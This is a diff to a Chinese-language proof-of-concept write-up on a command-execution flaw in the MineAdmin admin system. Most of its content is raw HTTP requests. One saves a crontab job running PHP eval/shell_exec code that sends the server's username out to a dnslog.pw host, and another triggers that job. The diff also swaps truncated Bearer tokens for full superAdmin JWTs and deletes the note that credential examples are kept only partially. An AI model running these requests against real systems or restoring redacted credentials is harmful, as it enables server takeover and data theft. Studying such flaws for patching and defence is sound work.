@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -67,7 +67,7 @@ POC/EXP：利用system/refresh接口生成漏洞利用token
 POST /system/refresh HTTP/1.1
 Host: 127.0.0.1:9501
 Accept: application/json, text/plain, */*
-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJI
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWM2MTVhOGI0YzY2LjkyMzg1MzE1IiwiaWF0IjoxNzY3NjYxOTE0LjU3MDU5MSwibmJmIjoxNzY3NjYxOTE0LjU3MDU5MSwiZXhwIjoxNzcwMjUzOTE0LjU3MDU5MSwiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.I2U0hOY91omT0Dh1K6Wibnx04D2fv03Pb1MWX9CRXdI
 Content-Type: application/json;charset=UTF-8
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
 Accept-Encoding: gzip, deflate
@@ -86,17 +86,18 @@ POC/EXP：添加恶意命令（此处用dnslog回显命令）
 ```http
 POST /setting/crontab/save HTTP/1.1
 Host: 127.0.0.1:9501
-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJI
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
 Content-Type: application/json;charset=UTF-8
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
 Accept: application/json, text/plain, */*
 Accept-Encoding: gzip, deflate
 Accept-Language: zh_CN
+Content-Length: 141
 
 {"singleton":"2","status":"1","name":"test","type":"4","rule":"30 */5 * * * *","target":"eval('$user = shell_exec(\"whoami\"); system(\"ping -n 1 \" . trim($user) . \".5yzhle6v.dnslog.pw\");');"}
 ```
 
-> 请求长度说明：原资料 Content-Length 为 141；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 141；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20260108153851665](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108153851665.png)
 
@@ -106,17 +107,18 @@ POC/EXP：执行恶意命令
 ```http
 POST /setting/crontab/run HTTP/1.1
 Host: 127.0.0.1:9501
-Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJI
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZWZhdWx0XzY5NWNiNWY3ZWVhODAyLjkxMTg5NDMwIiwiaWF0IjoxNzY3NjgzNTc1Ljk3NzU0MywibmJmIjoxNzY3NjgzNTc1Ljk3NzU0MywiZXhwIjoxNzY3NjkwNzc1Ljk3NzU0MywiaWQiOjEsInVzZXJuYW1lIjoic3VwZXJBZG1pbiIsInVzZXJfdHlwZSI6IjEwMCIsIm5pY2tuYW1lIjoi5Yib5aeL5Lq6IiwiY3JlYXRlZF9hdCI6IjIwMjUtMDctMDIgMTM6Mzg6NDEiLCJ1cGRhdGVkX2F0IjoiMjAyNi0wMS0wNiAxNzoxNDowMCIsInJlbWFyayI6bnVsbCwiand0X3NjZW5lIjoiZGVmYXVsdCJ9.BUVL91bTIAMMyvVdsu7jFffSl39IWVZV2hpKYzuWPaI
 Accept-Encoding: gzip, deflate
 Accept-Language: zh_CN
 Accept: application/json, text/plain, */*
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
 Content-Type: application/json;charset=UTF-8
+Content-Length: 8
 
 {"id":2}
 ```
 
-> 请求长度说明：原资料 Content-Length 为 8；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 8；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20260108154028074](./.resource/MineAdmin企业级后台管理系统命令执行漏洞/media/image-20260108154028074.png)
 
